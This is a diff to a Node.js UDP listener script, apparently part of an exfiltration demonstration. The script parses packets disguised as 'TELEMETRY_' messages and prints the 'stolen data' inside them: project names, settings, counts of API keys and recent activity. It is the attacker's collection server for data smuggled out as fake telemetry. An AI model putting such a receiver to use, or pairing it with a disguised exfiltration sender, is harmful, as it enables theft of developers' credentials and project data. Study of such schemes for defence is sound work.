@@ -1,7 +1,7 @@
 #!/usr/bin/env node
 
 const dgram = require('dgram');
-const chalk = require('chalk');
+const chalk = require('chalk').default || require('chalk');
 
 const server = dgram.createSocket('udp4');
 
@@ -14,9 +14,45 @@ server.on('message', (msg, rinfo) => {
   console.log(chalk.red(`📡 INTERCEPTED from ${rinfo.address}:${rinfo.port}`));
   console.log(chalk.yellow(`   Size: ${msg.length} bytes`));
   
-  // Show first 100 chars of data
-  const preview = msg.toString().substring(0, 100);
-  console.log(chalk.dim(`   Data: ${preview}...`));
+  try {
+    // Try to parse the stolen data
+    const dataStr = msg.toString();
+    if (dataStr.includes('TELEMETRY_')) {
+      const jsonStart = dataStr.indexOf('{');
+      if (jsonStart !== -1) {
+        const jsonData = JSON.parse(dataStr.substring(jsonStart));
+        
+        if (jsonData.stolenData && jsonData.stolenData.length > 0) {
+          console.log(chalk.red(`   🚨 STOLEN DATA DETECTED!`));
+          jsonData.stolenData.forEach((item, i) => {
+            console.log(chalk.yellow(`   [${i+1}] Source: ${item.source}`));
+            
+            if (item.data.projects) {
+              console.log(chalk.magenta(`       Projects: ${item.data.projects.slice(0,2).join(', ')}...`));
+            }
+            if (item.data.settings) {
+              console.log(chalk.cyan(`       Settings: ${Object.keys(item.data.settings).slice(0,3).join(', ')}...`));
+            }
+            if (item.data.credentials) {
+              console.log(chalk.red(`       🔑 API Keys: ${item.data.credentials.length} found`));
+            }
+            if (item.data.recentActivity) {
+              console.log(chalk.dim(`       Recent: ${item.data.recentActivity[0]?.substring(0,50)}...`));
+            }
+          });
+        } else {
+          console.log(chalk.dim(`   Data: ${dataStr.substring(0, 100)}...`));
+        }
+      }
+    } else {
+      console.log(chalk.dim(`   Data: ${dataStr.substring(0, 100)}...`));
+    }
+  } catch (e) {
+    // Show preview if parsing fails
+    const preview = msg.toString().substring(0, 100);
+    console.log(chalk.dim(`   Data: ${preview}...`));
+  }
+  
   console.log('');
 });
 
